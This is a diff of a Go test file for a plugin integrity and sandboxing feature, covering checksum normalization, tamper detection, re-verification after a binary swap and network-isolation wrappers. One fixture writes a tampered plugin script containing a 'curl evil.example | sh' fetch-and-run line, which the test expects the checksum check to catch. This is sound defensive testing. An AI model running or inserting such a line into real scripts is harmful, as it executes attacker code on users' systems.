@@ -8,69 +8,125 @@ import (
 	"testing"
 )
 
-func TestVerifyChecksum(t *testing.T) {
-	dir := t.TempDir()
-	bin := filepath.Join(dir, "plugin.sh")
-	if err := os.WriteFile(bin, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
+func writeExec(t *testing.T, dir, name, body string) string {
+	t.Helper()
+	p := filepath.Join(dir, name)
+	if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
 		t.Fatal(err)
 	}
+	return p
+}
+
+func TestNormalizeChecksum(t *testing.T) {
+	hex64 := strings.Repeat("ab", 32)
+
+	// Unpinned forms.
+	for _, in := range []string{"", "   "} {
+		got, pinned, err := normalizeChecksum(in)
+		if err != nil || pinned || got != "" {
+			t.Errorf("%q should be unpinned, got (%q,%v,%v)", in, got, pinned, err)
+		}
+	}
+
+	// Accepted forms — normalization must trim/lowercase BEFORE stripping the
+	// prefix, so uppercase and padded variants work (the bug in the first rework).
+	for _, in := range []string{hex64, "sha256:" + hex64, "SHA256:" + strings.ToUpper(hex64), "  sha256:" + hex64 + "  "} {
+		got, pinned, err := normalizeChecksum(in)
+		if err != nil || !pinned || got != hex64 {
+			t.Errorf("%q should normalize to %q, got (%q,%v,%v)", in, hex64, got, pinned, err)
+		}
+	}
+
+	// Malformed non-blank values must ERROR, not silently mean "unpinned".
+	for _, in := range []string{"sha256:", "deadbeef", "sha256:zz" + strings.Repeat("a", 62)} {
+		if _, pinned, err := normalizeChecksum(in); err == nil || pinned {
+			t.Errorf("%q should be rejected as malformed, got pinned=%v err=%v", in, pinned, err)
+		}
+	}
+}
+
+func TestVerifyChecksum_DetectsTampering(t *testing.T) {
+	dir := t.TempDir()
+	bin := writeExec(t, dir, "plugin.sh", "#!/bin/sh\nexit 0\n")
 	sum, err := fileSHA256(bin)
 	if err != nil {
 		t.Fatal(err)
 	}
-
-	// Unpinned manifests stay valid (backward compatible).
 	if err := verifyChecksum(bin, ""); err != nil {
-		t.Errorf("empty checksum should pass, got %v", err)
-	}
-	// Correct digest passes, with or without the sha256: prefix.
-	if err := verifyChecksum(bin, sum); err != nil {
-		t.Errorf("matching checksum should pass, got %v", err)
+		t.Errorf("unpinned should pass: %v", err)
 	}
 	if err := verifyChecksum(bin, "sha256:"+strings.ToUpper(sum)); err != nil {
-		t.Errorf("prefixed/uppercase checksum should pass, got %v", err)
+		t.Errorf("uppercase prefixed digest should pass: %v", err)
 	}
-
-	// Tampering with the binary after install must be detected.
-	if err := os.WriteFile(bin, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
-		t.Fatal(err)
-	}
+	writeExec(t, dir, "plugin.sh", "#!/bin/sh\ncurl evil.example | sh\n")
 	err = verifyChecksum(bin, sum)
-	if err == nil {
-		t.Fatal("expected tampered binary to fail the integrity check")
-	}
-	if !strings.Contains(err.Error(), "integrity check") {
-		t.Errorf("unexpected error text: %v", err)
+	if err == nil || !strings.Contains(err.Error(), "integrity check") {
+		t.Fatalf("expected tampering to be detected, got %v", err)
 	}
 }
 
-// applyNetworkIsolation must never hard-fail: when the platform cannot enforce
-// isolation it returns the command unchanged (with a warning), which is the
-// regression that sank PR #255.
+// The guard must re-verify after the binary changes, not trust the boot-time
+// result — that was the "boot-only verification" finding.
+func TestIntegrityGuard_ReverifiesAfterSwap(t *testing.T) {
+	dir := t.TempDir()
+	bin := writeExec(t, dir, "p.sh", "#!/bin/sh\nexit 0\n")
+	sum, err := fileSHA256(bin)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var g integrityGuard
+	if err := g.check(bin, sum); err != nil {
+		t.Fatalf("first check should pass: %v", err)
+	}
+	if err := g.check(bin, sum); err != nil {
+		t.Fatalf("repeat check on unchanged file should pass: %v", err)
+	}
+	// Swap the binary: size and mtime change, so the guard must re-hash and fail.
+	writeExec(t, dir, "p.sh", "#!/bin/sh\necho pwned; exit 0\n")
+	if err := g.check(bin, sum); err == nil {
+		t.Fatal("guard must detect a binary swapped after the first verification")
+	}
+}
+
 func TestApplyNetworkIsolation_NeverHardFails(t *testing.T) {
-	// network allowed → command untouched.
 	bin, args := applyNetworkIsolation("p", "/usr/bin/tool", true)
 	if bin != "/usr/bin/tool" || len(args) != 0 {
-		t.Errorf("network:true should pass the command through, got %q %v", bin, args)
+		t.Errorf("network:true should pass through, got %q %v", bin, args)
 	}
 
-	// network denied → either wrapped (Linux w/ userns) or passed through with a
-	// warning. Both are valid; what matters is that we get a runnable command.
 	bin, args = applyNetworkIsolation("p", "/usr/bin/tool", false)
 	if bin == "" {
-		t.Fatal("expected a runnable binary, got empty string")
+		t.Fatal("expected a runnable binary")
 	}
 	if bin == "/usr/bin/tool" {
 		if len(args) != 0 {
 			t.Errorf("pass-through should have no extra args, got %v", args)
 		}
-		return // platform can't isolate — acceptable, warning was logged
+		return // platform can't isolate — acceptable, warning logged
 	}
-	// Wrapped form: the real executable must be the final argument.
 	if runtime.GOOS != "linux" {
 		t.Errorf("unexpected isolation wrapper on %s: %q", runtime.GOOS, bin)
 	}
 	if len(args) == 0 || args[len(args)-1] != "/usr/bin/tool" {
 		t.Errorf("wrapped command must end with the executable, got %q %v", bin, args)
+	}
+}
+
+// The wrapper must exec in place (no --fork/--pid), so the plugin's stdin/stdout
+// protocol pipes survive. Guard the argv shape that guarantees it.
+func TestNetIsolationPrefix_ExecsInPlace(t *testing.T) {
+	prefix := detectNetIsolation()
+	if len(prefix) == 0 {
+		t.Skip("no network isolation available on this host")
+	}
+	for _, bad := range []string{"--fork", "-f", "--pid"} {
+		for _, a := range prefix {
+			if a == bad {
+				t.Errorf("prefix must not contain %q (would break stdin piping): %v", bad, prefix)
+			}
+		}
+	}
+	if prefix[len(prefix)-1] != "--" {
+		t.Errorf("prefix should end with -- to terminate flag parsing: %v", prefix)
 	}
 }
